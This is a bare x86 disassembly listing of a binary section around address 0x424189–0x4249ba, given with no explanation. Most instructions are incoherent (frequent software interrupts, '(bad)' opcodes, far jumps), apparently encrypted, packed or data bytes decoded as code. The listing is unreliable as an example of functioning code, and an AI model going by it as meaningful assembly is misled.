  424189:	cmp    esp,ecx
  42418b:	shr    ebx,cl
  42418d:	xchg   edx,eax
  42418e:	shl    ebp,cl
  424190:	sub    BYTE PTR [ebx+0xc],dl
  424193:	inc    ebx
  424194:	adc    ebp,DWORD PTR [edi]
  424196:	add    eax,0x8080877f
  42419b:	int    0xca
  42419d:	add    DWORD PTR [eax-0x69327f80],eax
  4241a3:	std    
  4241a4:	int    0xa6
  4241a6:	std    
  4241a7:	cmp    ebx,DWORD PTR [ecx-0xc2c1ec5]
  4241ad:	xchg   edx,eax
  4241ae:	shl    ebp,cl
  4241b0:	sub    BYTE PTR [ebx-0x2b],dl
  4241b3:	inc    ebx
  4241b4:	adc    ebp,DWORD PTR [edi]
  4241b6:	add    eax,0x8080875b
  4241bb:	xchg   DWORD PTR [ebp-0xe72f578],ecx
  4241c1:	int    0xf1
  4241c3:	cmp    ebx,DWORD PTR [ecx-0x1ec46233]
  4241c9:	shl    ebx,cl
  4241cb:	xchg   edx,eax
  4241cc:	shl    ebp,cl
  4241ce:	sub    BYTE PTR [ebx-0x2b],dl
  4241d1:	or     dl,BYTE PTR [esi+0x1196cd11]
  4241d7:	inc    ebx
  4241d8:	icebp  
  4241d9:	aam    0x26
  4241db:	int    0x76
  4241dd:	std    
  4241de:	int    0x96
  4241e0:	std    
  4241e1:	cmp    ebx,ecx
  4241e3:	cmp    edi,DWORD PTR [ecx-0x2d]
  4241e6:	jmp    0xd253:0x92bdd328
  4241ed:	int    0x96
  4241ef:	adc    DWORD PTR [ebx-0x26],esi
  4241f2:	adc    al,0x5e
  4241f4:	test   BYTE PTR [edx-0x2a],cl
  4241f7:	xor    cl,ch
  4241f9:	jbe    0x4241f8
  4241fb:	int    0x96
  4241fd:	std    
  4241fe:	cmp    ebx,ecx
  424200:	cmp    edi,DWORD PTR [ecx-0x2d]
  424203:	jmp    0xd253:0x92bdd328
  42420a:	int    0x96
  42420c:	adc    DWORD PTR [ebx-0x26],esi
  42420f:	adc    al,0x5e
  424211:	je     0x42425d
  424213:	xor    BYTE PTR [edi],ch
  424215:	add    eax,0x808092df
  42421a:	int    0x76
  42421c:	std    
  42421d:	int    0x76
  42421f:	std    
  424220:	int    0xa6
  424222:	std    
  424223:	int    0x76
  424225:	std    
  424226:	cmp    ecx,ecx
  424228:	cmp    ebp,DWORD PTR [ecx-0x2cd7522d]
  42422e:	in     al,dx
  42422f:	xchg   edx,eax
  424230:	push   ebx
  424231:	popf   
  424232:	int    0x76
  424234:	adc    DWORD PTR [ebx+0x6d],esi
  424237:	adc    al,0x87
  424239:	ror    ebp,cl
  42423b:	jl     0x42426d
  42423d:	xchg   DWORD PTR [ebp-0x5272f578],ecx
  424243:	int    0x8d
  424245:	std    
  424246:	int    0x96
  424248:	std    
  424249:	cmp    ecx,DWORD PTR [edi]
  42424b:	cmp    ebx,ecx
  42424d:	shr    ebx,cl
  42424f:	xchg   edx,eax
  424250:	shr    edx,cl
  424252:	sub    BYTE PTR [ebx+0x13],dl
  424255:	int    0x96
  424257:	std    
  424258:	or     cl,BYTE PTR [ebp+0xa88cd95]
  42425e:	lea    esi,[ebp+0x3bfd8dcd]
  424264:	cdq    
  424265:	cmp    esi,eax
  424267:	shl    edx,cl
  424269:	sub    bl,dl
  42426b:	repz xchg edx,eax
  42426d:	push   ebx
  42426e:	jecxz  0x42423d
  424270:	lea    esi,[ebp-0x792becbd]
  424276:	xchg   DWORD PTR [ebp-0x6a72f578],ecx
  42427c:	int    0x8d
  42427e:	std    
  42427f:	int    0x96
  424281:	std    
  424282:	cmp    ecx,DWORD PTR [edi]
  424284:	cmp    ebx,ecx
  424286:	shr    ebx,cl
  424288:	xchg   edx,eax
  424289:	shr    edx,cl
  42428b:	sub    BYTE PTR [ebx+0x13],dl
  42428e:	xchg   DWORD PTR [esp+ecx*2-0x37],edi
  424292:	jbe    0x424231
  424294:	popa   
  424295:	and    DWORD PTR [esi-0x777278cb],eax
  42429b:	or     cl,BYTE PTR [ebp-0x32781313]
  4242a1:	(bad)  
  4242a2:	in     eax,dx
  4242a3:	int    0x76
  4242a5:	dec    esp
  4242a6:	int    0x1
  4242a8:	adc    DWORD PTR [ecx+0x718080],eax
  4242ae:	xor    ch,cl
  4242b0:	jbe    0x4242fe
  4242b2:	add    dh,dl
  4242b4:	in     eax,dx
  4242b5:	int    0x1
  4242b7:	adc    DWORD PTR [ecx+0x70008080],eax
  4242bd:	dec    esp
  4242be:	leave  
  4242bf:	jbe    0x424266
  4242c1:	pop    DWORD PTR [ebp*1-0x5a89368a]
  4242c8:	dec    edx
  4242c9:	pop    ss
  4242ca:	xchg   BYTE PTR ds:0xcdfd8dcd,dh
  4242d0:	xchg   esi,eax
  4242d1:	std    
  4242d2:	cmp    ecx,DWORD PTR [edi]
  4242d4:	cmp    ebx,ecx
  4242d6:	shr    ebx,cl
  4242d8:	xchg   edx,eax
  4242d9:	shr    edx,cl
  4242db:	sub    BYTE PTR [ebx+0x13],dl
  4242de:	or     dh,BYTE PTR [esi-0x4b]
  4242e1:	inc    ebx
  4242e2:	jge    0x4242ba
  4242e4:	pop    eax
  4242e5:	int    0x76
  4242e7:	stc    
  4242e8:	int    0x8d
  4242ea:	stc    
  4242eb:	cmp    edi,DWORD PTR [ecx+0x3b]
  4242ee:	lock shl edx,cl
  4242f1:	sub    bl,dl
  4242f3:	mov    ebp,0xcdd35392
  4242f8:	lea    esp,[ebp+0x3ba596cd]
  4242fe:	fnstcw WORD PTR [ebx]
  424300:	psrlq  mm5,mm2
  424303:	sub    BYTE PTR [edi+0x4c76cd9d],al
  424309:	int    0x1
  42430b:	adc    DWORD PTR [ecx-0x142c7f80],eax
  424311:	xchg   edx,eax
  424312:	push   ebx
  424313:	jecxz  0x424344
  424315:	rcl    ebp,1
  424317:	bound  eax,QWORD PTR [eax]
  424319:	jo     0x42434f
  42431b:	int    0x76
  42431d:	std    
  42431e:	int    0x8d
  424320:	std    
  424321:	cmp    edi,DWORD PTR [ecx+0x3b]
  424324:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42432b:	push   ebx
  42432c:	rol    DWORD PTR [ebx+0x76],cl
  42432f:	mov    ch,0xd6
  424331:	and    ch,cl
  424333:	jbe    0x4242d2
  424335:	int    0x8d
  424337:	popf   
  424338:	cmp    esi,eax
  42433a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42433d:	mov    ebp,0x28f2d392
  424342:	push   ebx
  424343:	jge    0x424388
  424345:	fld    TBYTE PTR [edi]
  424347:	pop    es
  424348:	xchg   esp,eax
  424349:	add    BYTE PTR [eax],al
  42434b:	add    ch,cl
  42434d:	jbe    0x42434c
  42434f:	int    0x8d
  424351:	std    
  424352:	cmp    edi,DWORD PTR [ecx+0x3b]
  424355:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42435c:	push   ebx
  42435d:	rol    DWORD PTR [ebx+0x76],cl
  424360:	mov    ch,0xd6
  424362:	and    ch,cl
  424364:	jbe    0x42435f
  424366:	int    0x8d
  424368:	stc    
  424369:	cmp    edi,DWORD PTR [ecx+0x3b]
  42436c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424373:	push   ebx
  424374:	rol    DWORD PTR [ecx-0x5f14428a],cl
  42437a:	add    DWORD PTR [eax-0x12893680],0x67f1048e
  424384:	leave  
  424385:	jbe    0x42437c
  424387:	fdivr  st,st(4)
  424389:	sbb    al,0xb
  42438b:	int    0xa6
  42438d:	std    
  42438e:	int    0x76
  424390:	std    
  424391:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  424397:	xchg   edx,eax
  424398:	shr    DWORD PTR [ebp-0x1462acd8],cl
  42439e:	sbb    al,BYTE PTR [ecx+0x76cd8080]
  4243a4:	std    
  4243a5:	int    0x8d
  4243a7:	std    
  4243a8:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243ab:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243b2:	push   ebx
  4243b3:	ror    DWORD PTR [edx],cl
  4243b5:	jbe    0x4243a4
  4243b7:	int    0x76
  4243b9:	std    
  4243ba:	int    0x8d
  4243bc:	std    
  4243bd:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243c0:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243c7:	push   ebx
  4243c8:	ror    DWORD PTR [edx],cl
  4243ca:	jbe    0x4243c1
  4243cc:	int    0x8d
  4243ce:	std    
  4243cf:	int    0x76
  4243d1:	std    
  4243d2:	cmp    ecx,DWORD PTR [edi]
  4243d4:	cmp    ecx,ecx
  4243d6:	shr    DWORD PTR [ebp-0x6d142cd8],cl
  4243dc:	push   ebx
  4243dd:	jge    0x4243ac
  4243df:	jbe    0x424376
  4243e1:	inc    ebx
  4243e2:	jge    0x4243b8
  4243e4:	xchg   ch,cl
  4243e6:	test   BYTE PTR ds:0xcded760a,bl
  4243ec:	jbe    0x42439b
  4243ee:	int    0x84
  4243f0:	sbb    eax,0xcdf5760a
  4243f5:	jbe    0x4243f4
  4243f7:	int    0x8d
  4243f9:	std    
  4243fa:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243fd:	lock shl edx,cl
  424400:	sub    bl,dl
  424402:	mov    ebp,0xcdd35392
  424407:	(bad)  
  424408:	in     eax,dx
  424409:	inc    ebx
  42440a:	rcl    esp,cl
  42440c:	push   esp
  42440d:	int    0x76
  42440f:	std    
  424410:	int    0x8d
  424412:	std    
  424413:	cmp    esi,eax
  424415:	cmp    edi,DWORD PTR [ecx-0x2d]
  424418:	repnz sub bl,dl
  42441b:	mov    ebp,0xcdd35392
  424420:	(bad)  
  424421:	in     eax,dx
  424422:	shr    ebx,cl
  424424:	sub    al,BYTE PTR [ebx-0x2d]
  424427:	aam    0x1c
  424429:	int    0x8d
  42442b:	in     eax,dx
  42442c:	int    0x76
  42442e:	dec    esp
  42442f:	int    0x1
  424431:	adc    DWORD PTR [ecx-0x44d07f80],eax
  424437:	retf   
  424438:	jno    0x42443a
  42443a:	(bad)  
  42443b:	mov    ch,0x0
  42443d:	jo     0x4243c7
  42443f:	in     al,dx
  424440:	push   ds
  424441:	int    0x76
  424443:	cmc    
  424444:	xchg   DWORD PTR [esi-0x78],esi
  424447:	int    0x8d
  424449:	dec    esp
  42444a:	int    0xa
  42444c:	adc    DWORD PTR [ecx+0x6d048080],eax
  424452:	xchg   edx,eax
  424453:	jo     0x424455
  424455:	(bad)  
  424456:	mov    ch,0x0
  424458:	jno    0x4243e2
  42445a:	or     dh,BYTE PTR [esi-0xb]
  42445d:	int    0x76
  42445f:	std    
  424460:	int    0x8d
  424462:	std    
  424463:	cmp    edi,DWORD PTR [ecx+0x3b]
  424466:	lock shl edx,cl
  424469:	sub    bl,dl
  42446b:	mov    ebp,0xcdd35392
  424470:	(bad)  
  424471:	cmc    
  424472:	inc    ebx
  424473:	ror    ebp,cl
  424475:	jbe    0x424470
  424477:	int    0x8d
  424479:	stc    
  42447a:	(bad)  
  42447b:	xor    DWORD PTR [ebx],edi
  42447d:	jns    0x4244ba
  42447f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424486:	push   ebx
  424487:	rol    DWORD PTR [ecx+0x1cecbd76],cl
  42448d:	cmp    esi,eax
  42448f:	cmp    edi,DWORD PTR [ecx-0x2d]
  424492:	repnz sub bl,dl
  424495:	mov    ebp,0xcdd35392
  42449a:	(bad)  
  42449b:	cmc    
  42449c:	das    
  42449d:	rcl    ebx,1
  42449f:	int    0x8d
  4244a1:	lods   eax,DWORD PTR ds:[esi]
  4244a2:	or     al,BYTE PTR [edi+ebx*1-0x32068933]
  4244a9:	(bad)  
  4244aa:	stc    
  4244ab:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244ae:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4244b5:	push   ebx
  4244b6:	rol    DWORD PTR [edi-0x2893263],cl
  4244bc:	int    0x8d
  4244be:	std    
  4244bf:	cmp    esi,eax
  4244c1:	cmp    edi,DWORD PTR [ecx-0x2d]
  4244c4:	repnz sub bl,dl
  4244c7:	mov    ebp,0xcdd35392
  4244cc:	lea    ebp,[ebp+0x2f1f845e]
  4244d2:	push   es
  4244d3:	or     al,0xff
  4244d5:	add    BYTE PTR [eax],al
  4244d7:	int    0x76
  4244d9:	adc    ebp,ecx
  4244db:	lea    edx,[ecx]
  4244dd:	ins    BYTE PTR es:[edi],dx
  4244de:	sar    DWORD PTR [ebp-0x30b330d8],cl
  4244e4:	test   BYTE PTR [eax-0x2cac7f80],al
  4244ea:	int    0x8d
  4244ec:	icebp  
  4244ed:	push   esi
  4244ee:	dec    ecx
  4244ef:	and    DWORD PTR [esi-0x2ec14cb],eax
  4244f5:	add    BYTE PTR [eax],al
  4244f7:	int    0x76
  4244f9:	std    
  4244fa:	int    0x8d
  4244fc:	std    
  4244fd:	cmp    edi,DWORD PTR [ecx+0x3b]
  424500:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424507:	push   ebx
  424508:	rcr    DWORD PTR [esi+0x76],cl
  42450b:	mov    ebp,0x76cd88d6
  424510:	stc    
  424511:	int    0x8d
  424513:	stc    
  424514:	in     al,dx
  424515:	xchg   ch,cl
  424517:	jbe    0x424516
  424519:	int    0x8d
  42451b:	std    
  42451c:	cmp    esi,eax
  42451e:	cmp    edi,DWORD PTR [ecx-0x56]
  424521:	shl    edx,cl
  424523:	sub    bl,dl
  424525:	mov    ebp,0xd353a892
  42452a:	arpl   bx,cx
  42452c:	ror    BYTE PTR [eax-0x12326980],cl
  424532:	add    al,0xed
  424534:	xor    al,0xc9
  424536:	jbe    0x424535
  424538:	dec    ecx
  424539:	and    DWORD PTR [esi-0x528936cb],eax
  42453f:	inc    ecx
  424540:	and    DWORD PTR [esi+0x4c76cd35],eax
  424546:	or     dh,BYTE PTR [esi+0x4c]
  424549:	cwde   
  42454a:	int    0x6d
  42454c:	int    0x76
  42454e:	std    
  42454f:	int    0x96
  424551:	std    
  424552:	sar    bh,0x5f
  424555:	shl    DWORD PTR [ecx],1
  424557:	xchg   BYTE PTR ds:0x3ba8d33b,dh
  42455d:	cdq    
  42455e:	shr    edx,cl
  424560:	sub    bl,dl
  424562:	mov    ebp,0xcdd25392
  424567:	xchg   esi,eax
  424568:	mov    BYTE PTR [ebx-0xf],al
  42456b:	das    
  42456c:	add    eax,0x80808159
  424571:	int    0x76
  424573:	mov    ch,cl
  424575:	xchg   esi,eax
  424576:	mov    BYTE PTR [edi+0xa9a6470],al
  42457c:	xchg   esi,eax
  42457d:	cmc    
  42457e:	leave  
  42457f:	jbe    0x42457a
  424581:	popa   
  424582:	and    DWORD PTR [esi-0x68932cb],eax
  424588:	int    0x96
  42458a:	stc    
  42458b:	cmp    ebx,DWORD PTR [ecx+0x3b28ead3]
  424591:	rcl    ebx,cl
  424593:	mov    ebp,0xcdd25392
  424598:	xchg   esi,eax
  424599:	std    
  42459a:	int    0xe6
  42459c:	std    
  42459d:	cmp    esp,ebx
  42459f:	cmp    edi,edi
  4245a1:	shr    ecx,cl
  4245a3:	sub    bl,dl
  4245a5:	repz xchg edx,eax
  4245a7:	push   ebx
  4245a8:	fxch   st(5)
  4245aa:	out    0xf5,al
  4245ac:	pop    esi
  4245ad:	xchg   esp,eax
  4245ae:	leave  
  4245af:	fsubr  QWORD PTR [edi]
  4245b1:	add    eax,0x8080816b
  4245b6:	int    0x96
  4245b8:	cmc    
  4245b9:	int    0x76
  4245bb:	mov    BYTE PTR [edi-0x7f7fd2f5],al
  4245c1:	or     ch,0x96
  4245c4:	mov    ch,cl
  4245c6:	out    0xf5,al
  4245c8:	xor    ebx,DWORD PTR [edx-0x21932ac]
  4245ce:	pop    ebx
  4245cf:	int    0xa6
  4245d1:	std    
  4245d2:	cmp    edi,edx
  4245d4:	cmp    ebp,DWORD PTR [ecx-0x2c6def2d]
  4245da:	in     eax,0x28
  4245dc:	push   ebx
  4245dd:	cld    
  4245de:	or     dl,BYTE PTR [esi+0x2fd943a5]
  4245e4:	add    eax,0x8080814f
  4245e9:	int    0x96
  4245eb:	std    
  4245ec:	int    0xe6
  4245ee:	std    
  4245ef:	cmp    esp,ebx
  4245f1:	cmp    edi,edi
  4245f3:	shl    ebx,cl
  4245f5:	xchg   edx,eax
  4245f6:	shr    ecx,cl
  4245f8:	sub    BYTE PTR [ebx-0x27],dl
  4245fb:	or     dl,BYTE PTR [esi+0x4c76c911]
  424601:	mov    dl,0x21
  424603:	xchg   BYTE PTR ds:0xcdfd96cd,dh
  424609:	out    0xfd,al
  42460b:	cmp    esp,ebx
  42460d:	cmp    edi,edi
  42460f:	shl    ebx,cl
  424611:	xchg   edx,eax
  424612:	shr    ecx,cl
  424614:	sub    BYTE PTR [ebx-0x27],dl
  424617:	jmp    0x42461b
  424619:	add    BYTE PTR [eax-0x2693280],0xcd
  424620:	(bad)  
  424621:	std    
  424622:	add    al,0xf7
  424624:	(bad)  
  424625:	cmp    esp,ebx
  424627:	sar    DWORD PTR [ecx-0x6d0c2cd8],cl
  42462d:	push   ebx
  42462e:	cdq    
  42462f:	iret   
  424630:	ja     0x42462b
  424632:	jecxz  0x424623
  424634:	inc    ebx
  424635:	cdq    
  424636:	das    
  424637:	add    al,0x21
  424639:	add    BYTE PTR [eax-0x3004cc80],0xe4
  424640:	jo     0x4245ca
  424642:	or     dl,dh
  424644:	mov    ch,0x2f
  424646:	mov    ebx,0xea121a
  42464b:	das    
  42464c:	add    BYTE PTR [eax-0x321269f6],0x96
  424653:	in     eax,dx
  424654:	xchg   DWORD PTR [eax],esi
  424656:	int    0xd6
  424658:	in     eax,dx
  424659:	xchg   DWORD PTR [eax-0x2d],edx
  42465c:	repz sub bl,dl
  42465f:	mov    ecx,0x2ffb5392
  424664:	mov    ebx,0x4cf3d31a
  424669:	adc    dh,bh
  42466b:	dec    ecx
  42466c:	and    DWORD PTR [esi-0x1229f5cb],eax
  424672:	or     dl,BYTE PTR [esi-0x12693243]
  424678:	int    0xd6
  42467a:	in     eax,dx
  42467b:	cmp    esp,ebx
  42467d:	add    al,0xf7
  42467f:	call   ebx
  424681:	repz xchg edx,eax
  424683:	sar    DWORD PTR [ecx-0x7866acd8],cl
  424689:	xchg   esi,eax
  42468a:	mov    BYTE PTR [edx],cl
  42468c:	xchg   esi,eax
  42468d:	in     eax,dx
  42468e:	int    0x96
  424690:	dec    esp
  424691:	int    0xd6
  424693:	dec    esp
  424694:	cmp    esp,ebx
  424696:	add    al,0xf7
  424698:	call   ebx
  42469a:	mov    ecx,0x92f3d328
  42469f:	push   ebx
  4246a0:	cdq    
  4246a1:	int    0xd6
  4246a3:	mov    ebp,0x32d6fb43
  4246a8:	int    0x96
  4246aa:	dec    esp
  4246ab:	int    0xd6
  4246ad:	dec    esp
  4246ae:	cmp    esp,ebx
  4246b0:	add    al,0xf7
  4246b2:	call   ebx
  4246b4:	mov    ecx,0x92f3d328
  4246b9:	push   ebx
  4246ba:	cdq    
  4246bb:	int    0xd6
  4246bd:	mov    ebp,0x88d6fb43
  4246c2:	int    0x96
  4246c4:	in     eax,dx
  4246c5:	int    0xd6
  4246c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c8:	add    DWORD PTR [edx+0x4],0x8d0092c9
  4246cf:	mov    ch,0x2f
  4246d1:	push   es
  4246d2:	xchg   ebx,eax
  4246d3:	add    BYTE PTR [eax],al
  4246d5:	add    BYTE PTR [ecx-0x6932ee5a],al
  4246db:	stc    
  4246dc:	int    0xd6
  4246de:	stc    
  4246df:	cmp    esp,ebx
  4246e1:	add    al,0xf7
  4246e3:	call   ebx
  4246e5:	mov    ecx,0x92f3d328
  4246ea:	push   ebx
  4246eb:	cdq    
  4246ec:	int    0xd6
  4246ee:	adc    ebp,ecx
  4246f0:	out    0xf5,al
  4246f2:	inc    ebx
  4246f3:	aam    0xd9
  4246f5:	in     al,0x77
  4246f7:	sub    al,0xcd
  4246f9:	xchg   esi,eax
  4246fa:	std    
  4246fb:	int    0xd6
  4246fd:	std    
  4246fe:	cmp    esp,ebx
  424700:	add    al,0xf7
  424702:	call   ebx
  424704:	repz xchg edx,eax
  424706:	sar    DWORD PTR [ecx+0x53c58728],cl
  42470c:	cdq    
  42470d:	int    0x9c
  42470f:	test   BYTE PTR [ebx-0x1e],al
  424712:	das    
  424713:	push   es
  424714:	test   BYTE PTR [eax],al
  424716:	add    BYTE PTR [eax],al
  424718:	arpl   bp,cx
  42471a:	jbe    0x4246c9
  42471c:	cmp    edx,ebx
  42471e:	int    0x8d
  424720:	lods   eax,DWORD PTR ds:[esi]
  424721:	add    al,0x2
  424723:	jmp    FWORD PTR [edx+0x76cd4aec]
  424729:	std    
  42472a:	cmp    edx,ebx
  42472c:	int    0x8d
  42472e:	std    
  42472f:	cmp    ecx,DWORD PTR [edi]
  424731:	shl    edx,cl
  424733:	sub    bl,dl
  424735:	mov    ebp,0xa8d35392
  42473a:	retf   
  42473b:	ror    BYTE PTR [eax-0x12326980],cl
  424741:	adc    ch,ch
  424743:	xchg   ebp,eax
  424744:	add    BYTE PTR [eax-0x2893680],0x49
  42474b:	and    DWORD PTR [esi-0x68936cb],eax
  424751:	inc    ecx
  424752:	and    DWORD PTR [esi-0x28932cb],eax
  424758:	int    0x8d
  42475a:	std    
  42475b:	cwde   
  42475c:	call   0x8621:0xd169ffc0
  424763:	xor    eax,0xbdd3793b
  424768:	xchg   edx,eax
  424769:	mov    al,ds:0xf2d3133b
  42476e:	sub    BYTE PTR [ebx-0x2d],dl
  424771:	or     dh,BYTE PTR [esi-0x53]
  424774:	int    0x76
  424776:	std    
  424777:	int    0x8d
  424779:	std    
  42477a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42477d:	mov    ebp,0xd3133b92
  424782:	repnz sub BYTE PTR [ebx-0x2d],dl
  424786:	or     dh,BYTE PTR [esi-0xf]
  424789:	int    0xe6
  42478b:	and    al,0xcd
  42478d:	jbe    0x42477c
  42478f:	int    0x8d
  424791:	in     eax,dx
  424792:	cmp    edx,ebx
  424794:	or     dh,BYTE PTR [esi-0x13]
  424797:	adc    dh,BYTE PTR [esi-0x13]
  42479a:	dec    ecx
  42479b:	mov    al,ds:0x76cd3586
  4247a0:	cmc    
  4247a1:	int    0x8d
  4247a3:	cmc    
  4247a4:	cmp    edx,ebx
  4247a6:	or     dh,BYTE PTR [esi-0xb]
  4247a9:	adc    dh,BYTE PTR [esi-0xb]
  4247ac:	dec    ecx
  4247ad:	lahf   
  4247ae:	xchg   BYTE PTR ds:0xcd1176cd,dh
  4247b4:	lea    edx,[ecx]
  4247b6:	cmp    edx,ebx
  4247b8:	or     dh,BYTE PTR [esi+0x11]
  4247bb:	adc    dh,BYTE PTR [esi+0x11]
  4247be:	imul   esp,DWORD PTR [ecx],0x76cd3586
  4247c4:	mov    ch,0xcd
  4247c6:	lea    esi,[ebp+0x760ad33b]
  4247cc:	mov    ch,0x12
  4247ce:	jbe    0x424785
  4247d0:	dec    ecx
  4247d1:	and    DWORD PTR [ebp+esi*1+0x212476c9],eax
  4247d8:	hlt    
  4247d9:	mov    esi,DWORD PTR ds:0x68876cd
  4247df:	ins    DWORD PTR es:[edi],dx
  4247e0:	das    
  4247e1:	add    eax,0x80808551
  4247e6:	int    0x76
  4247e8:	dec    esp
  4247e9:	push   es
  4247ea:	ins    DWORD PTR es:[edi],dx
  4247eb:	das    
  4247ec:	add    eax,0x80808538
  4247f1:	int    0x76
  4247f3:	sbb    al,0x6
  4247f5:	ins    DWORD PTR es:[edi],dx
  4247f6:	das    
  4247f7:	add    eax,0x80808523
  4247fc:	int    0x76
  4247fe:	and    al,0xcd
  424800:	jbe    0x424826
  424802:	int    0x8d
  424804:	mov    bl,dl
  424806:	mov    ebp,0x39af5692
  42480b:	add    BYTE PTR [eax+0x2f815eb8],0x6
  424812:	add    DWORD PTR [ebp+0x76cd8080],0xfd8dcdfd
  42481c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42481f:	mov    ebp,0xd3133b92
  424824:	repnz sub BYTE PTR [ebx-0x2d],dl
  424828:	or     dh,BYTE PTR [esi-0xf]
  42482b:	int    0x76
  42482d:	std    
  42482e:	int    0x76
  424830:	std    
  424831:	int    0x76
  424833:	mov    ch,cl
  424835:	lea    ecx,[eax-0x329b8379]
  42483b:	outs   dx,BYTE PTR ds:[esi]
  42483c:	jo     0x424848
  42483e:	lea    esp,[esi+eax*1]
  424841:	ins    DWORD PTR es:[edi],dx
  424842:	das    
  424843:	add    eax,0x808084f0
  424848:	leave  
  424849:	jbe    0x4247e0
  42484b:	dec    ecx
  42484c:	and    DWORD PTR [eax+0x35],edi
  42484f:	int    0x76
  424851:	xchg   ebp,eax
  424852:	pop    ebx
  424853:	int    0xa6
  424855:	xchg   ebp,eax
  424856:	cmp    edi,DWORD PTR [ecx+0x3b]
  424859:	loop   0x42482e
  42485b:	mov    ebp,0x28e5d392
  424860:	push   ebx
  424861:	popf   
  424862:	or     ah,BYTE PTR [esi-0x289326b]
  424868:	int    0x76
  42486a:	std    
  42486b:	int    0x8
  42486d:	sub    eax,0xcd808081
  424872:	xor    ch,cl
  424874:	bound  esp,QWORD PTR [edi+eax*4+0x30]
  424878:	int    0x76
  42487a:	std    
  42487b:	int    0x76
  42487d:	std    
  42487e:	int    0x8
  424880:	and    eax,0xcd808081
  424885:	sbb    al,0xa
  424887:	xchg   esi,eax
  424888:	dec    esp
  424889:	inc    ebx
  42488a:	fst    st(6)
  42488c:	push   0xffffffcd
  42488e:	(bad)  
  42488f:	cmc    
  424890:	int    0x8
  424892:	adc    DWORD PTR [ecx-0x69307f80],eax
  424898:	lods   eax,DWORD PTR ds:[esi]
  424899:	(bad)  
  42489a:	int    0x96
  42489c:	cmc    
  42489d:	cmp    ecx,DWORD PTR [edi]
  42489f:	add    al,0xfb
  4248a1:	call   ebx
  4248a3:	jmp    0x424837
  4248a5:	shr    edx,cl
  4248a7:	sub    BYTE PTR [ebx-0x1d],dl
  4248aa:	int    0x8d
  4248ac:	dec    esp
  4248ad:	bound  eax,QWORD PTR [eax]
  4248af:	xchg   ecx,eax
  4248b0:	jo     0x42490d
  4248b2:	add    BYTE PTR [eax+0x24],dh
  4248b5:	int    0x8d
  4248b7:	dec    esp
  4248b8:	int    0x6e
  4248ba:	xchg   esp,eax
  4248bb:	int    0x7e
  4248bd:	jo     0x4248f2
  4248bf:	jge    0x424932
  4248c1:	xchg   ebp,eax
  4248c3:	jo     0x424882
  4248c5:	dec    esi
  4248c6:	xchg   BYTE PTR [eax+0x248dcd80],al
  4248cc:	int    0x8
  4248ce:	xor    eax,0xa808081
  4248d3:	sbb    al,0x0
  4248d5:	xchg   ecx,eax
  4248d6:	xchg   esp,eax
  4248d7:	add    dh,dl
  4248d9:	mov    BYTE PTR [ebx-0x43],bl
  4248dc:	or     eax,0xcd808084
  4248e1:	pop    ebx
  4248e2:	fs xchg ebp,edx
  4248e5:	das    
  4248e6:	mov    ebx,0x74cf1452
  4248eb:	xor    BYTE PTR [edx+ecx*1],bl
  4248ee:	jbe    0x42490c
  4248f0:	int    0x76
  4248f2:	std    
  4248f3:	int    0x8d
  4248f5:	std    
  4248f6:	cmp    edi,DWORD PTR [ecx+0x4]
  4248f9:	add    bh,bh
  4248fb:	shl    edx,cl
  4248fd:	sub    bl,dl
  4248ff:	mov    ebp,0x2fd35392
  424904:	mov    ebx,0x960a868a
  424909:	and    al,0x43
  42490b:	jge    0x42493c
  42490d:	add    eax,0x808080e9
  424912:	int    0x76
  424914:	std    
  424915:	int    0x8d
  424917:	std    
  424918:	cmp    edi,DWORD PTR [ecx+0x4]
  42491b:	add    bh,bh
  42491d:	shl    edx,cl
  42491f:	sub    bl,dl
  424921:	mov    ebp,0xad35392
  424926:	jbe    0x4248cd
  424928:	int    0x76
  42492a:	stc    
  42492b:	int    0x8d
  42492d:	stc    
  42492e:	add    al,0x2
  424930:	(bad)  
  424931:	cmp    edi,DWORD PTR [ecx-0x2d]
  424934:	repnz sub bl,dl
  424937:	mov    ebp,0x2fd35392
  42493c:	mov    ebx,0x7d33868a
  424941:	pop    esi
  424942:	lea    esp,[ebp-0x7f2ef7d1]
  424948:	add    BYTE PTR [eax+0x41c8dcd],0xd3
  42494f:	mov    BYTE PTR [edx],cl
  424951:	lea    ebx,[esp+ebp*8]
  424954:	xchg   ebp,ecx
  424956:	lea    ebx,[ecx*8+0x31cd5c52]
  42495d:	or     dh,BYTE PTR [esi-0x63]
  424960:	jl     0x424968
  424962:	icebp  
  424963:	aam    0x89
  424965:	clc    
  424966:	icebp  
  424967:	sub    edx,edx
  424969:	xchg   DWORD PTR [esi-0x63],esi
  42496c:	in     al,dx
  42496d:	xchg   edx,eax
  42496e:	int    0xd2
  424970:	jo     0x42493f
  424972:	outs   dx,BYTE PTR ds:[esi]
  424973:	test   BYTE PTR [edi+0x63bd70c5],al
  424979:	test   DWORD PTR [eax+0x1c76cd80],eax
  42497f:	int    0x7c
  424981:	mov    BYTE PTR [edx],cl
  424983:	lea    ebx,[ebp-0x32027233]
  424989:	xchg   esi,eax
  42498a:	std    
  42498b:	cmp    ecx,DWORD PTR [edi]
  42498d:	add    al,0xfb
  42498f:	call   ebx
  424991:	jmp    0x424925
  424993:	shr    edx,cl
  424995:	sub    BYTE PTR [ebx+0x13],dl
  424998:	pop    esi
  424999:	lea    ebx,[ebp-0x7232e32c]
  42499f:	mov    BYTE PTR [edi-0x29ffb384],al
  4249a5:	popf   
  4249a6:	int    0x6c
  4249a8:	test   BYTE PTR [ecx-0x79],dh
  4249ab:	lds    esi,FWORD PTR [eax-0x43]
  4249ae:	add    eax,DWORD PTR [edi+0x76cd8080]
  4249b4:	sbb    al,0xcd
  4249b6:	(bad)  
  4249b7:	stc    
  4249b8:	int    0x96
  4249ba:	stc    
